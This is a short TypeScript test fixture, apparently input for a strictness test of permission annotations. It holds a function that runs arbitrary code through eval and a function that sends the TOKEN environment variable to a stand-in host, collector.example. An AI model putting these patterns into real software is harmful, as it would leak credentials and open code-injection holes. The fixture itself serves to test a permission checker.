// Used by test/strictness.test.ts: annotation rules relax at sketch; explicit configuration doesn't.

export function runs(code: string) {
  return eval(code);
}

/** @perm env(TOKEN), net(collector.example) */
export async function leaks() {
  await fetch("https://collector.example/", { body: process.env.TOKEN });
}
